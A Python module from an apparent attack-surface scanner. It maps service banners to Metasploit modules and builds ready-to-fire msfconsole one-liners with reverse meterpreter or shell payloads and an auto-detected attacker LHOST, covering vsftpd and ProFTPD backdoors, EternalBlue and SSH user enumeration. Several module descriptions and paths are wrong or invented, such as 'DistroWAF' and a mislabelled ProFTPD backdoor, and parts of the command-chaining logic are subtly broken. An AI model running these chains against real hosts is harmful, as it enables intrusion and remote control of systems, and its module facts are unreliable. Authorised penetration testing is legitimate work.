"""msf_map.py — service/version → Metasploit exploit mapping.

Given the port + banner data the scanner already collects, this engine
suggests the right Metasploit module chain for each exposed service:

    1. CHECK phase  — auxiliary scanner modules verify the vulnerability
                      is actually present (never blind-fire exploits).
    2. EXPLOIT phase — only offered when the banner version matches a
                      known-vulnerable range; a payload is pre-selected
                      for the target OS family and LHOST is auto-detected.

Output is a plain-dict list shaped for the dashboard and terminal flow:
    {host, port, service, product, version, stage, module, payload,
     lhost, cmd, risk_level, description}

`cmd` is a ready-to-run `msfconsole -q -x "..."` one-liner that the
operator can fire from the prefilled terminal or the Action Center.
"""
from __future__ import annotations

import logging
import os
import re
import socket
from typing import Any, Dict, List, Optional

logger = logging.getLogger("AttackSurface.MSFMap")

# ---------------------------------------------------------------------------
# Payload defaults per target family
# ---------------------------------------------------------------------------
PAYLOADS = {
    "windows": "windows/x64/meterpreter/reverse_tcp",
    "linux": "linux/x64/meterpreter/reverse_tcp",
    "unix": "cmd/unix/interact",
    "java": "java/meterpreter/reverse_tcp",
    "php": "php/meterpreter/reverse_tcp",
}

# ---------------------------------------------------------------------------
# Service → Metasploit module knowledge base
#
# Each entry:
#   match      : regex on the product name (from nmap banner)
#   version    : optional (min, max) inclusive range; None = any version
#   stage      : 'check' (scanner only) | 'exploit' (confirmed vuln class)
#   module     : Metasploit module fullname
#   payload    : payload family key (see PAYLOADS)
#   os_family  : target OS family for payload resolution
#   risk       : 1-10
#   desc       : human description
#
# Philosophy: scanners for everything, exploits ONLY for versions we can
# pin precisely. The operator always confirms before anything fires.
# ---------------------------------------------------------------------------
SERVICE_MAP: List[Dict[str, Any]] = [
    # ---- FTP -------------------------------------------------------------
    {"match": r"vsftpd", "version": ("2.3.4", "2.3.4"), "stage": "exploit",
     "module": "exploit/unix/ftp/vsftpd_234_backdoor", "payload": "unix",
     "os_family": "linux", "risk": 10,
     "desc": "vsftpd 2.3.4 backdoor (DistroWAF) — instant root shell"},
    {"match": r"vsftpd", "version": None, "stage": "check",
     "module": "auxiliary/scanner/ftp/ftp_version", "payload": "unix",
     "os_family": "linux", "risk": 4,
     "desc": "FTP banner grab + anonymous login check"},
    {"match": r"proftpd", "version": ("1.3.3", "1.3.3c"), "stage": "exploit",
     "module": "exploit/unix/ftp/proftp_backdoor", "payload": "unix",
     "os_family": "linux", "risk": 10,
     "desc": "ProFTPD 1.3.3c mod_copy backdoor"},
    {"match": r"^(ftp|ftps|ftp-anon)$", "version": None, "stage": "check",
     "module": "auxiliary/scanner/ftp/ftp_login", "payload": "unix",
     "os_family": "linux", "risk": 4,
     "desc": "FTP anonymous/default-credential probe (banner unknown)"},
    {"match": r"proftpd|pure-ftpd|wu-ftp|filezilla", "version": None,
     "stage": "check", "module": "auxiliary/scanner/ftp/ftp_login",
     "payload": "unix", "os_family": "linux", "risk": 4,
     "desc": "FTP brute-force surface check (wordlist login test)"},

    # ---- SSH -------------------------------------------------------------
    {"match": r"openssh", "version": (None, "7.6"), "stage": "exploit",
     "module": "exploit/unix/ssh/openssh_userenum_timing", "payload": "unix",
     "os_family": "linux", "risk": 7,
     "desc": "OpenSSH < 7.7 username enumeration (CVE-2018-15473 class)"},
    {"match": r"openssh", "version": (None, "8.9"), "stage": "check",
     "module": "auxiliary/scanner/ssh/ssh_enumusers", "payload": "unix",
     "os_family": "linux", "risk": 5,
     "desc": "SSH user enumeration + auth-method survey"},
    {"match": r"openssh|dropbear|ssh", "version": None, "stage": "check",
     "module": "auxiliary/scanner/ssh/ssh_version", "payload": "unix",
     "os_family": "linux", "risk": 3,
     "desc": "SSH version + algorithm survey"},

    # ---- Telnet ----------------------------------------------------------
    {"match": r"telnet", "version": None, "stage": "check",
     "module": "auxiliary/scanner/telnet/telnet_encrypt", "payload": "unix",
     "os_family": "linux", "risk": 6,
     "desc": "Telnet encryption downgrade survey (CredSSP/rollback class)"},

    # ---- RDP -------------------------------------------------------------
    {"match": r"ms-wbt|terminal services|rdp", "version": None, "stage": "check",
     "module": "auxiliary/scanner/rdp/ms12_020_check", "payload": "windows",
     "os_family": "windows", "risk": 7,
     "desc": "RDP MS12-020 (CVE-2012-0002) pre-auth check"},

    # ---- SMB / Windows ---------------------------------------------------
    {"match": r"microsoft-ds|smb|netbios-ssn", "version": None, "stage": "check",
     "module": "auxiliary/scanner/smb/ms17_010", "payload": "windows",
     "os_family": "windows", "risk": 8,
     "desc": "MS17-010 (EternalBlue) vulnerability scanner — confirms first"},
    {"match": r"microsoft-ds|smb|netbios-ssn", "version": None, "stage": "exploit",
     "module": "exploit/windows/smb/ms17_010_eternalblue", "payload": "windows",
     "os_family": "windows", "risk": 10,
     "desc": "EternalBlue MS17-010 — chained after the ms17_010 scanner confirms"},

    # ---- Databases -------------------------------------------------------
    {"match": r"mysql|maria", "version": None, "stage": "check",
     "module": "auxiliary/scanner/mysql/mysql_version", "payload": "linux",
     "os_family": "linux", "risk": 6,
     "desc": "MySQL version + default-credential probe"},
    {"match": r"postgres|pgsql", "version": None, "stage": "check",
     "module": "auxiliary/scanner/postgres/postgres_version", "payload": "linux",
     "os_family": "linux", "risk": 6,
     "desc": "PostgreSQL version + auth survey"},
    {"match": r"redis", "version": None, "stage": "check",
     "module": "auxiliary/scanner/redis/redis_server", "payload": "linux",
     "os_family": "linux", "risk": 7,
     "desc": "Redis unauthenticated access check"},
    {"match": r"mongo", "version": None, "stage": "check",
     "module": "auxiliary/scanner/mongodb/mongodb_login", "payload": "linux",
     "os_family": "linux", "risk": 7,
     "desc": "MongoDB no-auth access check"},

    # ---- Mail / web misc -------------------------------------------------
    {"match": r"smtp|postfix|exim|sendmail", "version": None, "stage": "check",
     "module": "auxiliary/scanner/smtp/smtp_enum", "payload": "linux",
     "os_family": "linux", "risk": 4,
     "desc": "SMTP user enumeration + open-relay survey"},
    {"match": r"http-proxy|squid|varnish", "version": None, "stage": "check",
     "module": "auxiliary/scanner/http/proxy", "payload": "linux",
     "os_family": "linux", "risk": 5,
     "desc": "HTTP proxy open-relay / CONNECT abuse check"},
]


def auto_lhost() -> str:
    """Best-effort attacker IP for reverse payloads (env override wins)."""
    env = os.environ.get("MSF_LHOST")
    if env:
        return env
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def parse_banner(port_info: Dict[str, Any]) -> tuple[str, str]:
    """Extract (product, version) from a scanner port dict."""
    raw = str(port_info.get("service_versioned")
              or port_info.get("banner")
              or port_info.get("service")
              or "")
    # forms seen in the wild: "ftp — vsftpd 2.3.4", "vsftpd 2.3.4", "ssh?"
    raw = raw.replace("—", " ").replace("–", " ")
    m = re.search(r"([A-Za-z][A-Za-z0-9_.+-]*)\s+v?(\d+(?:\.\d+)*(?:[a-z]\d*)?)",
                  raw, re.IGNORECASE)
    if m:
        version = re.sub(r"p\d+$", "", m.group(2))  # OpenSSH 8.9p1 → 8.9
        return m.group(1).lower(), version
    m2 = re.search(r"([A-Za-z][A-Za-z0-9_.+-]*)", raw)
    return (m2.group(1).lower() if m2 else "", "")


def _ver_ok(version: str, bounds: Optional[tuple]) -> bool:
    """True when `version` falls inside inclusive (min, max) bounds.

    None bound = unbounded on that side; short bounds compare like 7.6 == 7.6.0.
    """
    if bounds is None:
        return True
    if not version:
        return False

    def key(s: str):
        return tuple(int(x) for x in re.findall(r"\d+", s)[:4])

    v = key(version)
    lo = key(bounds[0]) if bounds[0] else (0,)
    hi = key(bounds[1]) if bounds[1] else (9999,)
    n = max(len(v), len(lo), len(hi))
    v += (0,) * (n - len(v))
    lo += (0,) * (n - len(lo))
    hi += (0,) * (n - len(hi))
    return lo <= v <= hi


def match_module(product: str, version: str) -> Optional[Dict[str, Any]]:
    """Return the best SERVICE_MAP entry for a product/version pair.

    Version-pinned entries (e.g. vsftpd 2.3.4 backdoor) win when the
    banner version matches; otherwise fall back to a generic check entry.
    """
    fallback: Optional[Dict[str, Any]] = None
    for entry in SERVICE_MAP:
        if not re.search(entry["match"], product or "", re.IGNORECASE):
            continue
        if entry["version"] is not None:
            if _ver_ok(version, entry["version"]):
                return entry
        elif fallback is None:
            fallback = entry
    return fallback


def build_cmd(module: str, target: str, payload_family: str = "linux",
              lhost: str = "", stage: str = "check",
              extra_sets: Optional[Dict[str, str]] = None) -> str:
    """One-line msfconsole command: scanner first, exploit only when confirmed."""
    payload = PAYLOADS.get(payload_family, PAYLOADS["linux"])
    lhost = lhost or auto_lhost()
    parts = [f"use {module}", f"set RHOSTS {target}"]
    if stage == "exploit":
        # verify before firing: chain the matching scanner when one exists
        scanner = None
        for e in SERVICE_MAP:
            if e["module"] == module:
                break
            if e["stage"] == "check" and re.search(
                    e["match"], product_of_module(module), re.IGNORECASE):
                scanner = e["module"]
                break
        if scanner:
            parts = [f"use {scanner}", f"set RHOSTS {target}", "run",
                     f"use {module}", f"set RHOSTS {target}"]
        parts += ["check", f"set PAYLOAD {payload}",
                  f"set LHOST {lhost}", "run -j"]
    else:
        parts += ["run"]
    for k, v in (extra_sets or {}).items():
        parts.append(f"set {k} {v}")
    joined = "; ".join(parts)
    return f'msfconsole -q -x "{joined}"'


def product_of_module(module: str) -> str:
    """Reverse-lookup helper: module → product keyword it targets."""
    for e in SERVICE_MAP:
        if e["module"] == module:
            return e["match"]
    return ""


def map_host_ports(host: str, ports: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Map one host's open ports → msf suggestions (check + exploit chains)."""
    out: List[Dict[str, Any]] = []
    seen: set = set()
    for p in ports or []:
        if not isinstance(p, dict):
            continue
        product, version = parse_banner(p)
        entry = match_module(product, version)
        if not entry:
            continue
        key = (host, p.get("port"), entry["module"])
        if key in seen:
            continue
        seen.add(key)
        lhost = auto_lhost()
        cmd = build_cmd(entry["module"], host, entry["payload_family"]
                        if "payload_family" in entry else entry["payload"],
                        lhost=lhost, stage=entry["stage"])
        out.append({
            "host": host,
            "port": p.get("port"),
            "service": p.get("service") or product,
            "product": product,
            "version": version,
            "stage": entry["stage"],
            "module": entry["module"],
            "payload": PAYLOADS.get(entry["payload"], PAYLOADS["linux"]),
            "lhost": lhost,
            "cmd": cmd,
            "risk_level": entry["risk"],
            "description": entry["desc"],
        })
    return out


def map_hosts(hosts: List[Dict[str, Any]],
              ports_by_host: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """Map all scanned hosts → msf suggestions.

    Accepts either alive_hosts dicts (domain/ip) plus the runner's
    ports_by_host map (ctx.ports), or hosts rows that embed ports.
    """
    out: List[Dict[str, Any]] = []
    for h in hosts or []:
        domain = (h.get("domain") or h.get("host") or "") if isinstance(h, dict) else str(h)
        if not domain:
            continue
        ports = None
        if ports_by_host and isinstance(ports_by_host.get(domain), dict):
            ports = ports_by_host[domain].get("open_ports") or []
        elif isinstance(h, dict) and h.get("ports"):
            raw = h["ports"]
            if isinstance(raw, str):
                import json as _json
                try:
                    raw = _json.loads(raw)
                except Exception:
                    raw = []
            ports = raw
        out.extend(map_host_ports(domain, ports or []))
    return out
